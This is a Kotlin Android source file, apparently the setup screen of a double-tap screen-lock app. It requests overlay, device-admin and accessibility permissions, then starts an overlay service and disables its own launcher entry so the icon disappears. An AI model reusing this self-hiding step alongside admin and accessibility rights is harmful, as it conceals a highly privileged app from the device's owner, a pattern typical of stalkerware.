package com.dev.systemgesture.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.dev.systemgesture.admin.MyDeviceAdminReceiver
import com.dev.systemgesture.service.GestureAccessibilityService
import com.dev.systemgesture.service.OverlayService

class SetupActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btn = Button(this)
        btn.text = "Enable System Gesture Feature"
        setContentView(btn)

        btn.setOnClickListener {
            ensurePermissionsAndStart()
        }
    }

    override fun onResume() {
        super.onResume()
        if (canStartFeature()) {
            startOverlayService()
            hideLauncherIcon()
            finish()
        }
    }

    private fun ensurePermissionsAndStart() {
        if (!Settings.canDrawOverlays(this)) {
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
            )
            return
        }

        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)

        if (!dpm.isAdminActive(admin)) {
            startActivity(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Device admin gives the most reliable screen lock. You can skip and use accessibility fallback on supported Android versions."
                    )
                }
            )
        }

        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(
                this,
                "Enable accessibility service to detect double tap gestures.",
                Toast.LENGTH_LONG
            ).show()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            return
        }

        startOverlayService()
        hideLauncherIcon()
        finish()
    }

    private fun canStartFeature(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return Settings.canDrawOverlays(this) &&
            (dpm.isAdminActive(ComponentName(this, MyDeviceAdminReceiver::class.java)) ||
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) &&
            isAccessibilityServiceEnabled()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val manager = getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = manager.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )

        return enabledServices.any {
            it.resolveInfo?.serviceInfo?.packageName == packageName &&
                it.resolveInfo?.serviceInfo?.name == GestureAccessibilityService::class.java.name
        }
    }

    private fun startOverlayService() {
        val intent = Intent(this, OverlayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
